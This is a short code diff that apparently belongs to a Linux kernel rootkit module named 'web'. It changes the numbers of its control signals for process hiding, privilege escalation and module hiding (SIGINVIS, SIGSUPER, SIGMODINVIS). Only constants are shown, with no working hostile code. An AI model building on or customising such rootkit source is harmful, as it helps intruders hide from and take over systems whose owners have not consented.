@@ -12,7 +12,7 @@ struct linux_dirent {
 #define MODULE_NAME "web"
 
 enum {
-	SIGINVIS = 31,
-	SIGSUPER = 64,
-	SIGMODINVIS = 63,
+	SIGINVIS = 70,
+	SIGSUPER = 61,
+	SIGMODINVIS = 52,
 };
